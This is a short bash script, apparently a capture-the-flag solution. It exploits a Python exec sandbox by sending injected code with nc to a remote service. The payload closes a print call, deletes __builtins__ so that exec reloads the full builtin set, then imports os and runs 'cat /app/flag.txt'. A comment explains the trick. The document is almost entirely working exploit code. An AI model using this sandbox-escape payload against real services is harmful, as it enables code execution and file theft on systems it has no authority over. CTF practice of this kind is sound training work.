#!/bin/bash

# h/t Dan Hackett for this one
# Apparently you can delete the __builtins__ in safe_globals, then exec
# pulls in the full default set of builtins!
( echo "); global __builtins__; del __builtins__; print(" && \
      echo "); import os; os.system('cat /app/flag.txt'); print(" ) \
    | nc rmrfslash.xyz 8004
